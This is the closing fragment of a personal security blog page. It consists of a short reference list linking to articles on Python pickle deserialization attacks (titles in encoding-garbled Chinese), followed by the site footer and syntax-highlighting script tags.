<li><p><a target="_blank" rel="noopener" href="https://thesisapi.lib.nycu.edu.tw/server/api/core/bitstreams/affc3d4c-9f19-429a-b392-ce8420d7351b/content">Pain Pickle: ç¹é Python ä¸­å—é™åˆ¶çš„ Unpickler ä¹‹è‡ªå‹•åŒ–è„…è¿«ç”Ÿæˆ</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/163545">ç ”ç©¶äººå“¡æ­éœ²é‡å°æ©Ÿå™¨å­¸ç¿’æ¨¡å‹è€Œä¾†çš„æ”»æ“Šæ‰‹æ³•Sleepy Pickle</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickleååºåˆ—åŒ–</a></p>
</li>
</ul>
</div></article></div></main><footer><div class="paginator"><a href="/2025/08/14/IPAS%E8%B3%87%E5%AE%89%E5%B7%A5%E7%A8%8B%E5%B8%AB/" class="prev">PREV</a><a href="/2025/08/12/BlueTeamCheatSheet/" class="next">NEXT</a></div><div class="copyright"><p>Â© 2025 - 2026 <a href="https://yunshiuan.com">yunshiuan</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-clike.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-cpp.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-json.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markdown.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markup.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-css.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script><script>Prism.plugins.autoloader.languages_path = 'https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/';
</script><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>